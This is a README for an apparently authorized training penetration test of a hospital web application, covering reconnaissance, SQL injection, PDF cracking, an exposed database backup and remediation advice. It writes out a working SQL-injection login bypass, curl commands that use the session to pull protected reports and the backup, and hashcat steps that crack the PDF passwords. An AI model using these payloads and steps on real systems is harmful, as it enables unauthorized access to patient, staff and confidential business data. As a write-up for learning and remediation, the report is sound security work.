# Mediroza General Hospital — Authorized Penetration Testing Report

![Cybersecurity](https://img.shields.io/badge/Project-Cybersecurity-red)
![Penetration Testing](https://img.shields.io/badge/Testing-Penetration%20Testing-blue)
![Kali Linux](https://img.shields.io/badge/Environment-Kali%20Linux-purple)
![Status](https://img.shields.io/badge/Status-Completed-success)

---

## 📌 Project Overview

This project involved an authorized penetration test of the Mediroza General Hospital web application as part of a cybersecurity assessment.

The assessment focused on identifying security weaknesses in:

- Web application reconnaissance
- Exposed directories and files
- Authentication mechanisms
- Input validation
- SQL injection
- Access control
- Protected PDF documents
- PDF encryption
- Publicly accessible database backups
- Sensitive information exposure

**Target:** `https://medirozahospital.com`

**Assessment Type:** Authorized Web Application Penetration Test

**Testing Environment:** Kali Linux

**Assessment Period:** September 2026

**Tester:** Sarah Acquah

> **Authorization:** Testing was performed against the target provided for the associated cybersecurity assignment.

---

## 📋 Table of Contents

1. [Executive Summary](#-executive-summary)
2. [Scope](#-scope)
3. [Tools Used](#-tools-used)
4. [Methodology](#-methodology)
5. [Milestone 1 — Reconnaissance and Authentication Testing](#-milestone-1--reconnaissance-and-authentication-testing)
6. [Milestone 2 — PDF Password Recovery](#-milestone-2--pdf-password-recovery)
7. [Milestone 3 — Database Backup Exposure](#-milestone-3--database-backup-exposure)
8. [Milestone 4 — Final Report and Risk Assessment](#-milestone-4--final-report-and-risk-assessment)
9. [Findings](#-findings)
10. [Risk Rating](#-risk-rating)
11. [Recommendations](#-recommendations)
12. [Evidence](#-evidence)
13. [Repository Structure](#-repository-structure)
14. [Sensitive Data Handling](#-sensitive-data-handling)
15. [Conclusion](#-conclusion)
16. [Author](#-author)
17. [Disclaimer](#-disclaimer)

---

# 📄 Executive Summary

An authorized penetration test was conducted against the Mediroza General Hospital web application.

The assessment identified multiple security weaknesses affecting authentication, access control, document protection, server configuration, and sensitive information exposure.

The major findings included:

- Publicly accessible application directories.
- Exposure of application files and server information.
- SQL injection in the patient portal login mechanism.
- Successful authentication bypass through SQL injection.
- Unauthorized access to the patient portal.
- Access to three encrypted PDF reports.
- Weak PDF passwords that were recoverable through dictionary-based password recovery.
- A publicly accessible SQL database backup.
- Exposure of confidential employee salary information.
- Exposure of shareholder information.

The assessment demonstrated how weaknesses in input validation, authentication, access control, file protection, and server configuration could be combined to gain unauthorized access to protected resources.

---

# 🎯 Scope

## Target

`https://medirozahospital.com`

## In-Scope Activities

The assessment included:

- Passive reconnaissance
- Web directory enumeration
- HTTP response analysis
- Authentication testing
- Input validation testing
- SQL injection testing
- Authentication bypass testing
- Access-control testing
- PDF security analysis
- Password recovery testing
- Public file analysis
- Database backup analysis
- Sensitive information exposure analysis

Testing was limited to the authorized target.

---

# 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| Kali Linux | Penetration testing environment |
| Amass | Passive reconnaissance |
| curl | HTTP requests and response analysis |
| pdfinfo | PDF security inspection |
| pdf2john | PDF password hash extraction |
| John the Ripper | Password recovery testing |
| Hashcat | PDF password recovery |
| qpdf | PDF password verification |
| grep | Searching and filtering output |
| sed | Text processing |
| cut | Extracting specific fields |

---

# 🔬 Methodology

The assessment followed a structured penetration-testing process.

### Milestone 1 — Reconnaissance and Authentication

The first stage involved:

1. Passive reconnaissance.
2. Identification of exposed directories.
3. Analysis of web server responses.
4. Analysis of the authentication mechanism.
5. Input validation testing.
6. SQL injection testing.
7. Authentication bypass.
8. Access to the protected patient portal.
9. Retrieval of three encrypted PDF reports.

### Milestone 2 — PDF Password Recovery

The second stage involved:

1. Identifying PDF encryption.
2. Extracting PDF password hashes.
3. Identifying the correct Hashcat mode.
4. Preparing the hashes.
5. Selecting an appropriate wordlist.
6. Performing dictionary-based password recovery.
7. Verifying the recovered passwords.

### Milestone 3 — Sensitive Information Analysis

The third stage involved:

1. Analysis of publicly accessible files.
2. Discovery of an exposed SQL database backup.
3. Analysis of the database structure.
4. Identification of employee salary records.
5. Identification of shareholder records.
6. Documentation of the information exposure.

### Milestone 4 — Reporting

The final stage involved:

1. Documenting the vulnerabilities.
2. Classifying risk.
3. Documenting proof of exploitation.
4. Developing remediation recommendations.
5. Preparing the final penetration-testing report.

---

# 🔎 Milestone 1 — Reconnaissance and Authentication Testing

## 1. Passive Reconnaissance

Amass was used to perform passive reconnaissance against the authorized target.

Command:

    amass enum -passive -d medirozahospital.com

The reconnaissance identified:

    medirozahospital.com

### Evidence

<img width="1186" height="467" alt="Screenshot 2026-09-30 132330" src="https://github.com/user-attachments/assets/962d6b35-047f-4e29-b02f-642630176777" />


---

## 2. HTTP and HTTPS Analysis

The target was tested using HTTP headers.

Command:

    curl -I http://medirozahospital.com

The HTTP service redirected traffic to HTTPS.

The HTTPS service returned a successful response.

The server was identified as LiteSpeed.

### Evidence

<img width="690" height="317" alt="Screenshot 2026-09-30 132450" src="https://github.com/user-attachments/assets/e8ecd4d4-8ac9-43f5-9b4b-68bf126c26de" />


---

## 3. Robots.txt Analysis

The `robots.txt` file revealed several application directories:

    User-agent: *
    Disallow: /patient/
    Disallow: /staff/
    Disallow: /old/

    Sitemap: https://medirozahospital.com/sitemap.xml

Although `robots.txt` does not provide access control, the exposed paths provided useful reconnaissance information.

## 4. Patient Directory Enumeration

The `/patient/` directory was accessible and exposed application files.

Important discovered resources included:

    /patient/reports/
    /patient/download.php
    /patient/error_log
    /patient/login.php
    /patient/logout.php
    /patient/portal.php


---

## 5. Authentication Analysis

The patient portal login page contained username and password fields.

Login endpoint:

    https://medirozahospital.com/patient/login.php

A normal invalid login produced:

    Username not found

Testing malformed input produced a database error.

Command:

    curl -i -s -X POST -d "username='" -d "password=test" https://medirozahospital.com/patient/login.php

The application returned a MySQL syntax error.

This demonstrated that user-controlled input was reaching a SQL query without adequate parameterization.

### Evidence
<img width="647" height="507" alt="Screenshot 2026-09-30 101548" src="https://github.com/user-attachments/assets/33431e98-9470-44b0-a803-e6dbe3bdfcf4" />


---

## 6. SQL Injection Authentication Bypass

A controlled SQL injection test was performed against the authorized target.

The tested username payload was:

    admin' -- 

Command:

    curl -i -s -c cookies.txt -X POST -d "username=admin' -- " -d "password=test" https://medirozahospital.com/patient/login.php

The application returned:

    HTTP/2 302
    location: portal.php

This demonstrated successful authentication bypass.

### Evidence

---

## 7. Access to Patient Portal

The authenticated session was used to access:

    /patient/portal.php

Command:

    curl -s -b cookies.txt https://medirozahospital.com/patient/portal.php

The portal exposed three encrypted PDF reports:

    download.php?id=1
    download.php?id=2
    download.php?id=3

---

## 8. Downloading the Three PDFs

The authenticated session was used to retrieve the three PDF files.

Command:

    for id in 1 2 3; do
      curl -s -b cookies.txt -o "report$id.pdf" "https://medirozahospital.com/patient/download.php?id=$id"
    done

The downloaded files were:

    report1.pdf
    report2.pdf
    report3.pdf

Approximate file sizes:

    report1.pdf — 3.6K
    report2.pdf — 3.6K
    report3.pdf — 3.7K

### Evidence
<img width="692" height="583" alt="Screenshot 2026-09-30 133051" src="https://github.com/user-attachments/assets/27e99380-a057-49c4-8873-f65fc32c7795" />

---

# 🔐 Milestone 2 — PDF Password Recovery

The retrieved PDF documents were password protected.

Attempting to inspect the documents without the correct passwords resulted in an incorrect-password error.

---

## 1. Extracting PDF Hashes

`pdf2john` was used to extract the password hashes.

Commands:

    pdf2john report1.pdf > hash1.txt
    pdf2john report2.pdf > hash2.txt
    pdf2john report3.pdf > hash3.txt

The extracted hashes used the PDF format beginning with:

    $pdf$2*3*128*

---

## 2. Identifying the Hashcat Mode

Hashcat example hashes were checked using:

    hashcat --example-hashes | grep -i -A5 -B2 "PDF"

The matching PDF encryption mode was:

    10500

This corresponds to:

    PDF 1.4 - 1.6 (Acrobat 5 - 8)

---

## 3. Preparing the Hashes

The filename prefix from the `pdf2john` output was removed.

Commands:

    cut -d: -f2- hash1.txt > hash1-fixed.txt
    cut -d: -f2- hash2.txt > hash2-fixed.txt
    cut -d: -f2- hash3.txt > hash3-fixed.txt

---

## 4. Password Recovery

The `rockyou.txt` wordlist was used:

    /usr/share/wordlists/rockyou.txt

Report 1:

    hashcat -m 10500 -w 1 --force hash1-fixed.txt /usr/share/wordlists/rockyou.txt

Report 2:

    hashcat -m 10500 -w 1 --force hash2-fixed.txt /usr/share/wordlists/rockyou.txt

Report 3:

    hashcat -m 10500 -w 1 --force hash3-fixed.txt /usr/share/wordlists/rockyou.txt

All three PDF passwords were successfully recovered.

### Recovery Summary

| Document | Result |
|---|---|
| Report 1 | Password recovered |
| Report 2 | Password recovered |
| Report 3 | Password recovered |

> Recovered passwords are intentionally excluded from this public repository.

### Evidence

<img width="657" height="565" alt="Screenshot 2026-09-30 125523" src="https://github.com/user-attachments/assets/ebd6f267-ae99-413b-b00b-3b04c8366d4f" />


---

## 5. PDF Password Verification

The recovered password for Report 1 was verified using `qpdf`.

Command:

    qpdf --password=<RECOVERED_PASSWORD> --check report1.pdf

The output confirmed that the supplied password was accepted and that the PDF did not contain syntax or stream encoding errors.



# 🗄️ Milestone 3 — Database Backup Exposure

During reconnaissance, the `/old/` directory was found to be publicly accessible.

The directory contained:

    /old/mediroza_db_backup_2019.sql

The database backup was downloadable without authentication.

---

## 1. Retrieving the Database Backup

Command:

    curl -s https://medirozahospital.com/old/mediroza_db_backup_2019.sql > backup.sql

The database backup contained tables including:

    staff
    shareholders

The backup itself identified the information as confidential.

### Evidence

<img width="670" height="557" alt="Screenshot 2026-09-30 125950" src="https://github.com/user-attachments/assets/a4110064-00a4-4914-ad43-89a6fe957324" />


---

## 2. Staff Salary Information

The staff table contained the following fields:

    id
    full_name
    job_title
    department
    email
    phone
    national_id
    monthly_salary_zar
    date_joined

The `monthly_salary_zar` field exposed employee salary information.

The assessment identified 30 employee salary records.

Personally identifying information such as phone numbers, national IDs, and email addresses has been excluded from this public repository.

### Evidence

<img width="617" height="428" alt="Screenshot 2026-09-30 125930" src="https://github.com/user-attachments/assets/54158c4a-2dfd-45a1-8235-20a92ff8db77" />


---

## 3. Shareholder Information

The database also contained a `shareholders` table.

The table contained fields including:

    id
    shareholder_name
    share_percent
    shares_held
    share_class

The assessment identified shareholder records within the exposed database.

### Evidence

<img width="670" height="557" alt="Screenshot 2026-09-30 125950" src="https://github.com/user-attachments/assets/18fec48f-7025-46b5-b8fa-f21b7d5fa27b" />


---

# 📝 Milestone 4 — Final Report and Risk Assessment

The assessment findings were documented according to the following professional penetration-testing report structure:

1. Executive Summary
2. Scope and Methodology
3. Findings and Proof of Exploitation
4. Risk Rating
5. Recommendations and Remediation

---

# 🚨 Findings

## Finding 1 — SQL Injection

**Severity:** Critical

The patient login mechanism was vulnerable to SQL injection.

### Evidence

Malformed SQL input generated a MySQL syntax error, demonstrating unsafe SQL query construction.

A controlled SQL injection payload subsequently resulted in:

    HTTP/2 302
    location: portal.php

### Impact

An attacker could bypass authentication and gain access to protected patient portal functionality.

### Recommendation

Use parameterized SQL queries or prepared statements throughout the application.

---

## Finding 2 — Authentication Bypass

**Severity:** Critical

The SQL injection vulnerability allowed successful authentication bypass.

### Impact

An attacker could access functionality intended for authenticated users without possessing valid credentials.

### Recommendation

- Fix the SQL injection vulnerability.
- Implement secure authentication.
- Validate authentication server-side.
- Implement secure session management.
- Test all authentication endpoints after remediation.

---

## Finding 3 — Unauthorized Access to Protected Documents

**Severity:** Critical

Following authentication bypass, three encrypted PDF reports became accessible through the patient portal.

### Impact

Unauthorized access to protected documents represents a significant confidentiality risk.

### Recommendation

Every document request should verify:

1. Authentication
2. Authorization
3. Resource ownership

Sequential document IDs should not be sufficient to access protected files.

---

## Finding 4 — Weak PDF Passwords

**Severity:** High

All three PDF passwords were successfully recovered using a standard password wordlist.

### Impact

An attacker who obtains the encrypted documents could potentially recover their passwords and access the document contents.

### Recommendation

- Use strong randomly generated passwords.
- Avoid dictionary passwords.
- Use modern PDF encryption.
- Prefer application-level authorization where possible.

---

## Finding 5 — Public Database Backup

**Severity:** Critical

The SQL database backup was publicly accessible through:

    /old/mediroza_db_backup_2019.sql

The backup contained confidential staff and shareholder information.

### Impact

An attacker could retrieve sensitive organizational information without authentication.

### Recommendation

- Remove the backup from the web root.
- Store backups outside public directories.
- Restrict backup access.
- Encrypt backups.
- Review historical and temporary files.
- Scan web directories for exposed backup files.

---

## Finding 6 — Directory Listing and Information Disclosure

**Severity:** Medium

Directory listing exposed application structure and filenames.

Examples included:

    /patient/
    /staff/
    /old/

### Impact

Directory listings provide attackers with information that can assist further reconnaissance.

### Recommendation

Disable directory indexing and restrict access to sensitive directories.

---

# 📊 Risk Rating

| Finding | Severity | Justification |
|---|---|---|
| SQL Injection | Critical | Allowed manipulation of the authentication SQL query and authentication bypass |
| Authentication Bypass | Critical | Allowed unauthorized access to the patient portal |
| Protected Document Exposure | Critical | Protected documents became accessible after authentication bypass |
| Public Database Backup | Critical | Confidential staff and shareholder information was publicly accessible |
| Weak PDF Passwords | High | Encrypted documents could be unlocked through dictionary-based recovery |
| Directory Listing | Medium | Exposed application structure and sensitive filenames |

---

# 🛡️ Recommendations and Remediation

## 1. Fix SQL Injection Immediately

Replace dynamically constructed SQL queries with parameterized queries or prepared statements.

Example:

    cursor.execute(
        "SELECT * FROM users WHERE username = %s AND password = %s",
        (username, password)
    )

Never concatenate untrusted user input directly into SQL statements.

Passwords should also be securely hashed using a modern password-hashing algorithm.

---

## 2. Remove Sensitive Files From the Web Root

Remove the following types of files from publicly accessible directories:

- Database backups
- Old application files
- Logs
- Internal configuration files
- Temporary files

---

## 3. Secure Document Downloads

The application should verify that the authenticated user has permission to access each requested document.

Recommended flow:

    User
      ↓
    Authentication
      ↓
    Authorization
      ↓
    Ownership Verification
      ↓
    Document Access

Changing a document ID should never be sufficient to access another user's document.

---

## 4. Strengthen PDF Protection

Use:

- Strong passwords
- Unique passwords
- Randomly generated passwords
- Modern encryption settings

Avoid common passwords and dictionary words.

---

## 5. Disable Directory Listing

Directory indexing should be disabled for sensitive application directories.

---

## 6. Prevent Information Leakage

Production applications should not expose raw database or PHP errors.

Instead of displaying detailed errors such as:

    mysqli_query(): You have an error in your SQL syntax

the application should display a generic error message while recording technical details securely in server-side logs.

---

## 7. Secure Database Backups

Database backups should:

- Be stored outside the web root.
- Require authentication.
- Have restricted file permissions.
- Be encrypted.
- Be monitored.
- Be regularly reviewed.

---

## 8. Perform a Full Security Retest

After remediation, repeat the penetration test to verify that:

- SQL injection is no longer possible.
- Authentication bypass is no longer possible.
- Protected documents cannot be accessed without authorization.
- Database backups are no longer publicly accessible.
- Directory listing is disabled.
- PDF protection has been strengthened.

---

# 📸 Evidence

The following screenshots should be placed inside the `screenshots` directory:

    screenshots/
    ├── amass-recon.png
    ├── http-https.png
    ├── robots.png
    ├── patient-directory.png
    ├── sql-error.png
    ├── auth-bypass.png
    ├── patient-portal.png
    ├── downloaded-pdfs.png
    ├── report1-cracked.png
    ├── report2-cracked.png
    ├── report3-cracked.png
    ├── pdf-verification.png
    ├── database-backup.png
    ├── salary-exposure.png
    └── shareholder-exposure.png

---

# 📁 Repository Structure

    mediroza-pentest/
    │
    ├── README.md
    │
    ├── screenshots/
    │   ├── amass-recon.png
    │   ├── http-https.png
    │   ├── robots.png
    │   ├── patient-directory.png
    │   ├── sql-error.png
    │   ├── auth-bypass.png
    │   ├── patient-portal.png
    │   ├── downloaded-pdfs.png
    │   ├── report1-cracked.png
    │   ├── report2-cracked.png
    │   ├── report3-cracked.png
    │   ├── pdf-verification.png
    │   ├── database-backup.png
    │   ├── salary-exposure.png
    │   └── shareholder-exposure.png
    │
    └── evidence/
        └── milestone1-sqli-evidence.txt

---

# ⚠️ Sensitive Data Handling

This assessment involved sensitive information.

The following information should NOT be uploaded to a public GitHub repository:

- Patient PDF files
- Patient medical information
- Employee national IDs
- Employee phone numbers
- Employee email addresses
- Full database dumps
- Authentication cookies
- Recovered passwords
- Other confidential personal information

Screenshots containing sensitive information should be redacted before being uploaded.

---

# 📝 Conclusion

The penetration test identified several security weaknesses within the Mediroza General Hospital web application.

The major issues included:

- SQL injection
- Authentication bypass
- Unauthorized access to protected documents
- Weak PDF passwords
- Directory listing
- Public exposure of an internal database backup
- Exposure of employee salary information
- Exposure of shareholder information

The assessment demonstrated how an attacker could progress from reconnaissance to exploitation and access to sensitive information.

The recommended remediation actions should be implemented and followed by a complete security retest to confirm that the identified vulnerabilities have been resolved.

---

# 👤 Author

**Sarah Acquah**

Cybersecurity Intern - Networkwalks

**Cybersecurity Penetration Testing Project — 2026**

---

# 📚 Disclaimer

This repository documents an authorized cybersecurity assessment performed against the target provided for the associated training/academic assignment.

The techniques and tools documented here should only be used against systems for which explicit authorization has been obtained.
